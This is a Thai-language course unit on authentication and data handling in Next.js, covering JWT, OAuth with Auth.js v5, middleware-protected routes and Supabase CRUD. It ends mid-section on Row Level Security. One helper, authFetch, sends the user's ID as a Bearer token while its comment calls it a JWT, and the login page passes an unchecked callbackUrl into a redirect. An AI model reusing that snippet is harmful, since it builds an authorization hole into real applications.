# หน่วยที่ 5: การเชื่อมต่อ API, Authentication และการจัดการข้อมูล (Part 2)

> **หลักสูตร:** หลักการพัฒนาซอฟต์แวร์ด้วยเทคโนโลยี Front-End
> **ระดับ:** ปานกลาง–สูง (Intermediate–Advanced)
> **ระยะเวลา:** 1.5 สัปดาห์ (Part 2 จาก 3 สัปดาห์)
> **ต่อจาก:** Part 1 — HTTP Protocol, REST API, TanStack Query v5
> **ปรับปรุงล่าสุด:** พฤษภาคม 2026

---

## วัตถุประสงค์การเรียนรู้ (Part 2)

เมื่อเรียนจบ Part 2 ผู้เรียนจะสามารถ:

1. อธิบายได้ว่า JWT คืออะไร, โครงสร้างเป็นอย่างไร และวิธีเก็บที่ปลอดภัย
2. อธิบาย OAuth 2.0 Flow และตั้งค่า Login ด้วย Google ผ่าน Auth.js v5 ได้
3. จัดการ Session ฝั่ง Server และ Client ได้อย่างถูกต้อง
4. ป้องกัน Route ที่ต้อง Login ด้วย Next.js Middleware ได้
5. ตั้งค่า Supabase Project และเชื่อมต่อกับ Next.js ได้
6. ทำ CRUD Operations ผ่าน Supabase Client Library ได้
7. เข้าใจและตั้งค่า Row Level Security (RLS) เพื่อควบคุมสิทธิ์ข้อมูลได้
8. สร้าง Realtime Subscription เพื่อรับข้อมูลแบบ Live ได้
9. ป้องกันช่องโหว่ XSS, CORS และจัดการ Environment Variables ได้ถูกต้อง

---

## 5.3 Authentication ด้วย Auth.js v5

### Authentication คืออะไร? และต่างจาก Authorization อย่างไร?

คำสองคำนี้ผู้เรียนมักสับสน แต่มีความหมายต่างกันชัดเจน:

```
Authentication (ยืนยันตัวตน)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"คุณเป็นใคร?"

เช่น: การ Login ด้วย Email/Password หรือ Google
→ ระบบรู้แล้วว่าคุณคือ "สมชาย (userId: 123)"

Authorization (ควบคุมสิทธิ์)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"คุณมีสิทธิ์ทำอะไรได้บ้าง?"

เช่น: สมชายเป็น User ธรรมดา → เข้าหน้า Admin ไม่ได้
      สมาชิก Free → ดูหนัง HD ไม่ได้

ลำดับที่ถูกต้อง: Authentication ก่อน → แล้วค่อย Authorization
```

---

### Session-based vs Token-based Authentication

ก่อนจะเรียน JWT เราต้องเข้าใจภาพรวมของ 2 แนวทางหลัก:

```
Session-based (แบบเก่า)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. User Login → Server ตรวจสอบ Password
2. Server สร้าง Session ใน Database: { sessionId: "abc123", userId: 1 }
3. Server ส่ง Cookie ที่มี sessionId กลับไป Browser
4. ทุก Request ถัดไป Browser แนบ Cookie ไปด้วย
5. Server ดู sessionId → ค้นหาใน Database → รู้ว่าเป็นใคร

ข้อดี:  เพิกถอน Session ได้ทันที (Logout จริง)
ข้อเสีย: ทุก Request ต้อง Query Database → ช้าถ้า User เยอะ
         Scale ยาก (Server หลายตัวต้องแชร์ Database เดียวกัน)

Token-based / JWT (แบบปัจจุบัน)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. User Login → Server ตรวจสอบ Password
2. Server สร้าง JWT Token (มีข้อมูล userId, role, หมดอายุ ฯลฯ)
3. Server ส่ง JWT กลับไป Browser
4. ทุก Request ถัดไป Browser แนบ JWT ไปใน Header
5. Server "อ่าน" JWT โดยตรง ไม่ต้อง Query Database

ข้อดี:  เร็ว (ไม่ต้อง Query Database), Scale ง่าย
ข้อเสีย: เพิกถอน Token ยาก (ต้องรอหมดอายุ หรือ Blacklist)
```

---

### JWT — JSON Web Token ตั้งแต่รากฐาน

**JWT** คือ String ที่ประกอบด้วย 3 ส่วน คั่นด้วยจุด `.`

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywiZW1haWwiOiJzb21AZXhhbXBsZS5jb20iLCJyb2xlIjoidXNlciIsImV4cCI6MTcxNjM5MzYwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

โครงสร้าง: Header . Payload . Signature
           ──────   ───────   ─────────
```

**แยกทีละส่วน:**

```
─── ส่วนที่ 1: Header ───────────────────────────────────────────
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
                  ↓ Base64 Decode
{
  "alg": "HS256",   ← Algorithm ที่ใช้เซ็นลายเซ็น (HMAC SHA-256)
  "typ": "JWT"      ← ประเภท Token
}

─── ส่วนที่ 2: Payload ──────────────────────────────────────────
eyJ1c2VySWQiOjEyMywiZW1haWwiOiJzb21AZXhhbXBsZS5jb20iLCJyb2xlIjoidXNlciIsImV4cCI6MTcxNjM5MzYwMH0
                  ↓ Base64 Decode
{
  "userId": 123,
  "email": "som@example.com",
  "role": "user",
  "exp": 1716393600   ← หมดอายุ (Unix Timestamp)
}
⚠️  Payload อ่านได้ทุกคน! ห้ามใส่ Password หรือ Secret

─── ส่วนที่ 3: Signature ────────────────────────────────────────
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

= HMAC_SHA256(
    base64(Header) + "." + base64(Payload),
    SECRET_KEY   ← มีแค่ Server ที่รู้ Secret นี้
  )

นี่คือ "ตราประทับ" ที่ยืนยันว่า Token นี้ Server ออกให้จริง
ถ้าใครแก้ Payload → Signature จะไม่ตรง → Server ปฏิเสธ
```

**ทำไม Signature ถึงสำคัญ?**

```typescript
// สมมติ Hacker ต้องการแก้ role จาก "user" เป็น "admin"
// 1. Decode Payload → แก้ role → Encode ใหม่ → ทำได้ง่าย
// แต่...
// 2. Signature ที่เหลือยังเป็นของ Payload เดิม
// 3. Server ตรวจ Signature → ไม่ตรง → ปฏิเสธทันที

// ดังนั้น JWT ปลอดภัยตราบเท่าที่ SECRET_KEY ไม่รั่ว
```

---

### เก็บ JWT ที่ไหน? — ปัญหาที่นักพัฒนาหลายคนทำผิด

```
ตัวเลือกการเก็บ Token:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

localStorage / sessionStorage
────────────────────────────────────────────────────────────────
❌ ไม่ปลอดภัย!
JavaScript ทุกชิ้นบนหน้าเว็บอ่านได้
ถ้ามีช่องโหว่ XSS → Hacker ขโมย Token ได้ทันที
document.cookie ก็อ่านได้เหมือนกัน

Memory (JavaScript Variable)
────────────────────────────────────────────────────────────────
✅ XSS ขโมยไม่ได้
❌ Refresh หน้า → Token หาย → ต้อง Login ใหม่

HttpOnly Cookie ✅ (แนะนำที่สุด)
────────────────────────────────────────────────────────────────
✅ JavaScript อ่านไม่ได้ (HttpOnly Flag)
   → XSS ขโมยไม่ได้
✅ Browser แนบไปอัตโนมัติทุก Request
✅ รอด Refresh หน้า
⚠️  ต้องระวัง CSRF (แก้ด้วย SameSite Cookie + CSRF Token)

Auth.js v5 ใช้ HttpOnly Cookie โดย Default ✅
```

---

### OAuth 2.0 — Login ด้วย Google โดยไม่จัดการ Password เอง

**OAuth 2.0** คือ Protocol มาตรฐานที่อนุญาตให้แอปของเราขอ "การยืนยัน" จากบริการอื่น (เช่น Google) โดยไม่ต้องรู้ Password ของผู้ใช้

```
OAuth 2.0 Flow แบบ Authorization Code (ที่ Auth.js ใช้):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ผู้ใช้                   แอปเรา (Next.js)          Google
  │                           │                        │
  │  กด "Login ด้วย Google"   │                        │
  │ ─────────────────────────►│                        │
  │                           │  Redirect ไป Google    │
  │                           │  พร้อม client_id, scope │
  │                           │ ──────────────────────►│
  │                           │                        │
  │  Google ขอให้ Login       │                        │
  │ ◄──────────────────────────────────────────────────│
  │                           │                        │
  │  ผู้ใช้ Login + อนุญาต    │                        │
  │ ──────────────────────────────────────────────────►│
  │                           │                        │
  │                           │  ส่ง "Authorization     │
  │                           │  Code" กลับมา          │
  │                           │◄───────────────────────│
  │                           │                        │
  │                           │  แลก Code เป็น         │
  │                           │  Access Token          │
  │                           │ ──────────────────────►│
  │                           │                        │
  │                           │  รับ Access Token +    │
  │                           │  ข้อมูล User Profile   │
  │                           │◄───────────────────────│
  │                           │                        │
  │                           │  สร้าง Session ใน App  │
  │                           │  ตั้ง HttpOnly Cookie   │
  │  Redirect กลับ + เข้าสู่  │                        │
  │  ระบบสำเร็จ               │                        │
  │◄──────────────────────────│                        │

ข้อดี: แอปเราไม่เห็น Password Google ของผู้ใช้เลย!
       Google รับผิดชอบความปลอดภัยการ Login
```

---

### Auth.js v5 — ติดตั้งและตั้งค่า

**Auth.js** (เดิมชื่อ NextAuth.js) คือ Library Authentication มาตรฐานสำหรับ Next.js

**ติดตั้ง:**

```bash
pnpm add next-auth@beta
```

**สร้างไฟล์ตั้งค่าหลัก:**

```typescript
// auth.ts  ← ไฟล์นี้อยู่ที่ Root ของโปรเจกต์
import NextAuth from 'next-auth'
import Google from 'next-auth/providers/google'
import GitHub from 'next-auth/providers/github'

export const { handlers, signIn, signOut, auth } = NextAuth({
  providers: [
    Google({
      clientId: process.env.GOOGLE_CLIENT_ID!,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
    }),
    GitHub({
      clientId: process.env.GITHUB_CLIENT_ID!,
      clientSecret: process.env.GITHUB_CLIENT_SECRET!,
    }),
  ],

  // ─── Callbacks: ปรับแต่งพฤติกรรม ─────────────────────────
  callbacks: {
    // jwt: ทำงานทุกครั้งที่สร้างหรืออัปเดต JWT Token
    async jwt({ token, user }) {
      // user มีค่าเฉพาะตอน Login ครั้งแรก
      if (user) {
        token.userId = user.id
        token.role = 'user' // กำหนด Role เริ่มต้น
      }
      return token
    },

    // session: ทำงานเมื่อมีการอ่าน Session
    // กำหนดว่าข้อมูลอะไรบ้างที่จะส่งไปให้ Client
    async session({ session, token }) {
      if (token && session.user) {
        session.user.id = token.userId as string
        session.user.role = token.role as string
      }
      return session
    },
  },

  // หน้า Custom สำหรับ Login (ถ้าต้องการ)
  pages: {
    signIn: '/login',     // หน้า Login ที่สร้างเอง
    error: '/auth/error', // หน้าแสดง Error
  },
})
```

**ขยาย TypeScript Types:**

```typescript
// types/next-auth.d.ts
// ← เพิ่ม field ที่ Custom ไว้ใน jwt callback เข้าไปใน Type

import { DefaultSession } from 'next-auth'

declare module 'next-auth' {
  interface Session {
    user: {
      id: string
      role: string
    } & DefaultSession['user']
  }
}
```

**เชื่อมต่อกับ Next.js App Router:**

```typescript
// app/api/auth/[...nextauth]/route.ts
// ← Catch-all Route รับ Request ทุกอย่างที่เกี่ยวกับ Auth
import { handlers } from '@/auth'

export const { GET, POST } = handlers
```

**ตั้งค่า Environment Variables:**

```bash
# .env.local

# สร้างได้จาก: openssl rand -base64 32
AUTH_SECRET="your-random-secret-at-least-32-characters-long"

# Google OAuth — ดูวิธีสร้างด้านล่าง
GOOGLE_CLIENT_ID="xxxxx.apps.googleusercontent.com"
GOOGLE_CLIENT_SECRET="GOCSPX-xxxxxx"

# GitHub OAuth (optional)
GITHUB_CLIENT_ID="Iv1.xxxxxxxx"
GITHUB_CLIENT_SECRET="xxxxxxxx"
```

---

### สร้าง Google OAuth Credentials

```
ขั้นตอนสร้าง Google Client ID:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. ไปที่ https://console.cloud.google.com
2. สร้าง Project ใหม่ หรือเลือก Project ที่มีอยู่
3. ไปที่ "APIs & Services" → "Credentials"
4. คลิก "+ CREATE CREDENTIALS" → "OAuth client ID"
5. Application type: "Web application"
6. Name: ตั้งชื่อ เช่น "Movie Finder Dev"
7. Authorized redirect URIs: เพิ่ม:
   - http://localhost:3000/api/auth/callback/google   ← Development
   - https://yourdomain.com/api/auth/callback/google  ← Production
8. คลิก "CREATE"
9. Copy "Client ID" และ "Client Secret" ไปใส่ใน .env.local
```

---

### สร้างหน้า Login

```typescript
// app/login/page.tsx
import { signIn } from '@/auth'

export default function LoginPage() {
  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <div className="bg-white p-8 rounded-2xl shadow-sm w-full max-w-md">
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold text-gray-900">ยินดีต้อนรับ</h1>
          <p className="text-gray-500 mt-2">Login เพื่อเข้าใช้งาน Movie Finder</p>
        </div>

        {/* Google Login — ใช้ Server Action */}
        <form
          action={async () => {
            'use server'
            await signIn('google', { redirectTo: '/dashboard' })
          }}
        >
          <button
            type="submit"
            className="w-full flex items-center justify-center gap-3 px-4 py-3 border border-gray-300 rounded-xl hover:bg-gray-50 transition-colors"
          >
            <GoogleIcon className="w-5 h-5" />
            <span className="font-medium">Continue with Google</span>
          </button>
        </form>

        <div className="relative my-6">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-gray-200" />
          </div>
          <div className="relative flex justify-center text-sm">
            <span className="px-2 bg-white text-gray-500">หรือ</span>
          </div>
        </div>

        <form
          action={async () => {
            'use server'
            await signIn('github', { redirectTo: '/dashboard' })
          }}
        >
          <button
            type="submit"
            className="w-full flex items-center justify-center gap-3 px-4 py-3 bg-gray-900 text-white rounded-xl hover:bg-gray-800 transition-colors"
          >
            <GitHubIcon className="w-5 h-5" />
            <span className="font-medium">Continue with GitHub</span>
          </button>
        </form>
      </div>
    </div>
  )
}
```

---

### Session Management — ฝั่ง Server และ Client

**ฝั่ง Server Component (แนะนำ — ปลอดภัยกว่า):**

```typescript
// app/dashboard/page.tsx
// ← Server Component → ดึง Session โดยตรง ไม่ต้องส่ง JavaScript ไป Client

import { auth } from '@/auth'
import { redirect } from 'next/navigation'

export default async function DashboardPage() {
  const session = await auth()

  // ยังไม่ได้ Login → Redirect ไปหน้า Login
  if (!session) {
    redirect('/login')
  }

  return (
    <div>
      <h1>ยินดีต้อนรับ, {session.user.name}!</h1>
      <img
        src={session.user.image ?? '/default-avatar.png'}
        alt="Profile"
        className="w-12 h-12 rounded-full"
      />
      <p>อีเมล: {session.user.email}</p>
      <p>Role: {session.user.role}</p>
    </div>
  )
}
```

**ฝั่ง Client Component (ใช้เมื่อ UI ต้องตอบสนองต่อสถานะ Login):**

```typescript
// components/UserMenu.tsx
'use client'

import { useSession, signOut } from 'next-auth/react'

export function UserMenu() {
  // useSession: อ่าน Session จาก Context (ต้องมี SessionProvider)
  const { data: session, status } = useSession()

  // status: "loading" | "authenticated" | "unauthenticated"
  if (status === 'loading') {
    return <div className="w-8 h-8 rounded-full bg-gray-200 animate-pulse" />
  }

  if (!session) {
    return (
      <a href="/login" className="text-sm font-medium text-blue-600">
        Login
      </a>
    )
  }

  return (
    <div className="relative group">
      <button className="flex items-center gap-2">
        <img
          src={session.user.image ?? '/default-avatar.png'}
          alt={session.user.name ?? 'User'}
          className="w-8 h-8 rounded-full"
        />
        <span className="text-sm font-medium hidden md:block">
          {session.user.name}
        </span>
      </button>

      {/* Dropdown Menu */}
      <div className="absolute right-0 top-full mt-1 w-48 bg-white rounded-xl shadow-lg border border-gray-100 opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all">
        <div className="p-2">
          <p className="px-3 py-1 text-xs text-gray-500 truncate">
            {session.user.email}
          </p>
          <hr className="my-1" />
          <a href="/profile" className="block px-3 py-2 text-sm rounded-lg hover:bg-gray-50">
            โปรไฟล์
          </a>
          <a href="/favorites" className="block px-3 py-2 text-sm rounded-lg hover:bg-gray-50">
            รายการโปรด
          </a>
          <hr className="my-1" />
          <button
            onClick={() => signOut({ callbackUrl: '/' })}
            className="w-full text-left px-3 py-2 text-sm text-red-600 rounded-lg hover:bg-red-50"
          >
            ออกจากระบบ
          </button>
        </div>
      </div>
    </div>
  )
}
```

**ต้องเพิ่ม SessionProvider สำหรับ Client Component:**

```typescript
// app/providers.tsx  ← เพิ่มเข้าไปร่วมกับ QueryClientProvider
'use client'

import { SessionProvider } from 'next-auth/react'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { useState } from 'react'

export function Providers({ children }: { children: React.ReactNode }) {
  const [queryClient] = useState(() => new QueryClient())

  return (
    <SessionProvider>
      <QueryClientProvider client={queryClient}>
        {children}
      </QueryClientProvider>
    </SessionProvider>
  )
}
```

---

### Protected Routes — Middleware ใน Next.js

**Middleware** คือโค้ดที่รันก่อนทุก Request จะถึง Page — เหมาะมากสำหรับตรวจสอบ Authentication:

```typescript
// middleware.ts  ← ไฟล์นี้อยู่ที่ Root ของโปรเจกต์

import { auth } from '@/auth'
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

export default auth((req) => {
  const { nextUrl, auth: session } = req
  const isLoggedIn = !!session

  // ─── กำหนด Route ที่ต้อง Login ─────────────────────────────
  const protectedRoutes = ['/dashboard', '/favorites', '/profile', '/settings']
  const isProtectedRoute = protectedRoutes.some(route =>
    nextUrl.pathname.startsWith(route)
  )

  // ─── กำหนด Route เฉพาะ Admin ─────────────────────────────
  const adminRoutes = ['/admin']
  const isAdminRoute = adminRoutes.some(route =>
    nextUrl.pathname.startsWith(route)
  )

  // ยังไม่ Login และพยายามเข้า Protected Route
  if (isProtectedRoute && !isLoggedIn) {
    const loginUrl = new URL('/login', nextUrl.origin)
    // บันทึกหน้าที่พยายามเข้า เพื่อ Redirect กลับหลัง Login
    loginUrl.searchParams.set('callbackUrl', nextUrl.pathname)
    return NextResponse.redirect(loginUrl)
  }

  // Login แล้ว แต่พยายามเข้าหน้า Login อีกครั้ง → Redirect ไป Dashboard
  if (nextUrl.pathname === '/login' && isLoggedIn) {
    return NextResponse.redirect(new URL('/dashboard', nextUrl.origin))
  }

  // ตรวจสอบ Role สำหรับ Admin Route
  if (isAdminRoute && session?.user.role !== 'admin') {
    return NextResponse.redirect(new URL('/403', nextUrl.origin))
  }

  return NextResponse.next()
})

// ─── บอก Next.js ว่า Middleware นี้ทำงานกับ Path ไหนบ้าง ────
export const config = {
  matcher: [
    // ทำงานกับทุก Path ยกเว้น Static Files และ API Routes ของ Auth
    '/((?!api/auth|_next/static|_next/image|favicon.ico).*)',
  ],
}
```

**ตัวอย่าง: Redirect กลับหลัง Login สำเร็จ:**

```typescript
// app/login/page.tsx
import { signIn } from '@/auth'

interface LoginPageProps {
  searchParams: { callbackUrl?: string }
}

export default function LoginPage({ searchParams }: LoginPageProps) {
  // callbackUrl คือหน้าที่ผู้ใช้พยายามเข้าก่อน Redirect มา Login
  const callbackUrl = searchParams.callbackUrl || '/dashboard'

  return (
    <form
      action={async () => {
        'use server'
        // Login เสร็จ → Redirect กลับไปหน้าที่ต้องการ
        await signIn('google', { redirectTo: callbackUrl })
      }}
    >
      <button type="submit">Login ด้วย Google</button>
    </form>
  )
}
```

---

### ส่ง Token ไปกับ API Request

เมื่อต้องเรียก API ภายนอกที่ต้องการ Authentication:

```typescript
// lib/api.ts  ← เพิ่มการแนบ Token
import { auth } from '@/auth'

// สำหรับ Server Component / Server Action
async function authFetch<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
  const session = await auth()

  if (!session) {
    throw new Error('Unauthorized: กรุณา Login ก่อน')
  }

  const response = await fetch(`${process.env.API_URL}${endpoint}`, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      // ส่ง JWT ของผู้ใช้ไปกับทุก Request
      'Authorization': `Bearer ${session.user.id}`,
      ...options.headers,
    },
  })

  if (response.status === 401) {
    throw new Error('Session หมดอายุ กรุณา Login ใหม่')
  }

  if (!response.ok) {
    throw new Error(`API Error: ${response.status}`)
  }

  return response.json()
}

// ตัวอย่างการใช้งาน
export const userApi = {
  getFavorites: () => authFetch<Movie[]>('/user/favorites'),
  addFavorite: (movieId: number) =>
    authFetch<void>('/user/favorites', {
      method: 'POST',
      body: JSON.stringify({ movieId }),
    }),
}
```

---

## 5.4 Supabase — Backend as a Service

### Supabase คืออะไร?

**Supabase** คือ Open-source Alternative ของ Firebase ที่สร้างบน **PostgreSQL** ซึ่งเป็น Database ที่ทรงพลังที่สุดในโลก:

```
Supabase ให้อะไรบ้าง:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─────────────────────────────────────────────────────────┐
│                    Supabase Project                     │
├──────────┬──────────┬──────────┬──────────┬────────────┤
│PostgreSQL│   Auth   │ Storage  │ Realtime │  Edge Fn   │
│Database  │ Built-in │  Files   │   Live   │ Serverless │
│          │          │  & CDN   │  Update  │    Code    │
└──────────┴──────────┴──────────┴──────────┴────────────┘

เปรียบเทียบ:
Supabase ≈ PostgreSQL + Firebase Auth + AWS S3 + WebSocket Server
           รวมกันในที่เดียว พร้อม Dashboard UI สวยงาม
```

**ทำไมถึงเลือก Supabase?**

```
Supabase vs ทางเลือกอื่น:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Supabase              Firebase          PlanetScale/Neon
──────────────────    ──────────────    ────────────────────────
✅ PostgreSQL SQL      ⚠️  NoSQL (ยืด     ✅ SQL
   (ทักษะนำไปใช้ต่อ)       หยุ่นแต่ซับซ้อน)
✅ Open-source         ❌ Proprietary    ✅ Open-source
✅ Row Level Security  ✅ Security Rules  ❌ ไม่มีในตัว
✅ Realtime            ✅ Realtime        ❌ ไม่มีในตัว
✅ Auth Built-in       ✅ Auth Built-in   ❌ ต้องเพิ่มเอง
✅ Self-host ได้        ❌ ไม่ได้          ✅ ได้
✅ Free tier ใจดี      ⚠️  Free tier จำกัด ✅ Free tier ดี
```

---

### ตั้งค่า Supabase Project

**สร้าง Project ใหม่:**

```
1. ไปที่ https://supabase.com → Sign up ฟรี
2. คลิก "New Project"
3. ตั้งชื่อ: "movie-finder"
4. ตั้ง Database Password (เก็บไว้ให้ดี!)
5. เลือก Region: Southeast Asia (Singapore)
6. คลิก "Create new project" — รอ ~2 นาที

เมื่อ Project พร้อม ไปที่ Settings → API จะเห็น:
- Project URL: https://xxxxx.supabase.co
- anon key: eyJh... (ใช้ใน Client — ปลอดภัยที่จะเปิดเผย)
- service_role key: eyJh... (ใช้ใน Server ONLY — ห้ามเปิดเผย!)
```

**ติดตั้ง Supabase Client:**

```bash
pnpm add @supabase/supabase-js @supabase/ssr
```

**ตั้งค่า Environment Variables:**

```bash
# .env.local
NEXT_PUBLIC_SUPABASE_URL="https://xxxxx.supabase.co"
NEXT_PUBLIC_SUPABASE_ANON_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
# NEXT_PUBLIC_ คือ prefix ที่ทำให้ตัวแปรส่งไป Client ได้ (ปลอดภัยเพราะ anon key ออกแบบมาให้เปิดเผยได้)

# service_role ไม่มี NEXT_PUBLIC_ → อยู่ฝั่ง Server เท่านั้น
SUPABASE_SERVICE_ROLE_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

**สร้าง Supabase Client Helper:**

```typescript
// lib/supabase/client.ts
// ← ใช้ใน Client Component ('use client')
import { createBrowserClient } from '@supabase/ssr'

export function createClient() {
  return createBrowserClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
  )
}
```

```typescript
// lib/supabase/server.ts
// ← ใช้ใน Server Component, Server Action, Route Handler
import { createServerClient } from '@supabase/ssr'
import { cookies } from 'next/headers'

export async function createClient() {
  const cookieStore = await cookies()

  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        getAll() {
          return cookieStore.getAll()
        },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value, options }) => {
            cookieStore.set(name, value, options)
          })
        },
      },
    }
  )
}
```

> **กฎสำคัญ:** ใช้ `lib/supabase/client.ts` สำหรับ `'use client'` Component เท่านั้น ใช้ `lib/supabase/server.ts` สำหรับ Server Component, Server Action และ API Route Handler

---

### สร้าง Database Schema

ก่อนเขียนโค้ด เราต้องออกแบบ Database Table ก่อน เปิด Supabase Dashboard → SQL Editor:

```sql
-- สร้างตาราง profiles (เก็บข้อมูลผู้ใช้เพิ่มเติม)
CREATE TABLE profiles (
  id          UUID REFERENCES auth.users ON DELETE CASCADE PRIMARY KEY,
  username    TEXT UNIQUE,
  full_name   TEXT,
  avatar_url  TEXT,
  created_at  TIMESTAMPTZ DEFAULT NOW() NOT NULL,
  updated_at  TIMESTAMPTZ DEFAULT NOW() NOT NULL
);

-- สร้างตาราง favorites (หนังที่ผู้ใช้ชื่นชอบ)
CREATE TABLE favorites (
  id          BIGSERIAL PRIMARY KEY,
  user_id     UUID REFERENCES auth.users ON DELETE CASCADE NOT NULL,
  movie_id    INTEGER NOT NULL,           -- ID จาก TMDB API
  movie_title TEXT NOT NULL,
  poster_path TEXT,
  added_at    TIMESTAMPTZ DEFAULT NOW() NOT NULL,

  -- ป้องกัน User คนเดียวบันทึกหนังเรื่องเดียวซ้ำ
  UNIQUE(user_id, movie_id)
);

-- สร้างตาราง reviews
CREATE TABLE reviews (
  id          BIGSERIAL PRIMARY KEY,
  user_id     UUID REFERENCES auth.users ON DELETE CASCADE NOT NULL,
  movie_id    INTEGER NOT NULL,
  rating      SMALLINT NOT NULL CHECK (rating BETWEEN 1 AND 10),
  comment     TEXT,
  created_at  TIMESTAMPTZ DEFAULT NOW() NOT NULL,

  UNIQUE(user_id, movie_id) -- 1 User = 1 Review ต่อหนัง
);

-- Index เพื่อเพิ่มความเร็วในการค้นหา
CREATE INDEX favorites_user_id_idx ON favorites(user_id);
CREATE INDEX reviews_movie_id_idx ON reviews(movie_id);
```

**สร้าง Trigger อัปเดต updated_at อัตโนมัติ:**

```sql
-- Function สำหรับ Trigger
CREATE OR REPLACE FUNCTION update_updated_at()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = NOW();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Trigger บน profiles
CREATE TRIGGER profiles_updated_at
  BEFORE UPDATE ON profiles
  FOR EACH ROW EXECUTE FUNCTION update_updated_at();
```

---

### CRUD Operations — ตัวอย่างจริงทั้งหมด

**CREATE — เพิ่มหนังใน Favorites:**

```typescript
// lib/supabase/actions/favorites.ts
'use server'
// ← Server Action: ปลอดภัย, ทำงานบน Server

import { createClient } from '@/lib/supabase/server'
import { auth } from '@/auth'
import { revalidatePath } from 'next/cache'

export async function addFavorite(movieId: number, movieTitle: string, posterPath: string) {
  const session = await auth()
  if (!session) throw new Error('กรุณา Login ก่อน')

  const supabase = await createClient()

  const { data, error } = await supabase
    .from('favorites')       // ← ชื่อ Table
    .insert({
      user_id: session.user.id,
      movie_id: movieId,
      movie_title: movieTitle,
      poster_path: posterPath,
    })
    .select()  // ← ดึงข้อมูลที่เพิ่งเพิ่มกลับมาด้วย
    .single()  // ← คาดหวัง 1 แถว

  if (error) {
    // Error Code 23505 = Unique Violation (บันทึกซ้ำ)
    if (error.code === '23505') {
      throw new Error('คุณบันทึกหนังเรื่องนี้ไว้แล้ว')
    }
    throw new Error(`เกิดข้อผิดพลาด: ${error.message}`)
  }

  // บอกให้ Next.js ล้าง Cache ของหน้า /favorites
  revalidatePath('/favorites')

  return data
}
```

**READ — ดึงรายการ Favorites:**

```typescript
// lib/supabase/queries/favorites.ts

// ─── ฝั่ง Server Component (แนะนำ) ────────────────────────
export async function getFavorites(userId: string) {
  const supabase = await createClient()

  const { data, error } = await supabase
    .from('favorites')
    .select('*')                    // ← ดึงทุก Column
    .eq('user_id', userId)          // ← WHERE user_id = userId
    .order('added_at', { ascending: false })  // ← ORDER BY added_at DESC
    .limit(50)                      // ← LIMIT 50

  if (error) throw new Error(error.message)

  return data ?? []
}

// ─── ดึงพร้อม Join ──────────────────────────────────────────
// ถ้า favorites มี relation กับ reviews
export async function getFavoritesWithReviews(userId: string) {
  const supabase = await createClient()

  const { data, error } = await supabase
    .from('favorites')
    .select(`
      *,
      reviews (
        id,
        rating,
        comment,
        created_at
      )
    `)
    .eq('user_id', userId)

  if (error) throw new Error(error.message)
  return data ?? []
}

// ─── ตรวจว่าหนังนี้บันทึกไว้แล้วหรือยัง ────────────────────
export async function isFavorite(userId: string, movieId: number) {
  const supabase = await createClient()

  const { count, error } = await supabase
    .from('favorites')
    .select('*', { count: 'exact', head: true }) // ← COUNT(*) ไม่ดึง data
    .eq('user_id', userId)
    .eq('movie_id', movieId)

  if (error) return false
  return (count ?? 0) > 0
}
```

**UPDATE — แก้ไข Review:**

```typescript
export async function updateReview(
  reviewId: number,
  userId: string,
  updates: { rating?: number; comment?: string }
) {
  const supabase = await createClient()

  const { data, error } = await supabase
    .from('reviews')
    .update({
      ...updates,
      // updated_at จัดการโดย Trigger อัตโนมัติ
    })
    .eq('id', reviewId)
    .eq('user_id', userId)  // ← สำคัญ! แก้ได้เฉพาะของตัวเอง
    .select()
    .single()

  if (error) throw new Error(error.message)
  return data
}
```

**DELETE — ลบ Favorite:**

```typescript
export async function removeFavorite(movieId: number) {
  const session = await auth()
  if (!session) throw new Error('กรุณา Login ก่อน')

  const supabase = await createClient()

  const { error } = await supabase
    .from('favorites')
    .delete()
    .eq('user_id', session.user.id)
    .eq('movie_id', movieId)

  if (error) throw new Error(error.message)

  revalidatePath('/favorites')
}
```

---

### Row Level Security (RLS) — รั้วป้องกันข้อมูล

**RLS** คือ Feature ที่ทำให้ Database ตัดสินใจเองว่า User คนไหนเข้าถึงแถวไหนได้ — เป็นชั้นความปลอดภัยที่ทำงานตรงที่ Database ไม่ใช่แค่ใน Application Code

```
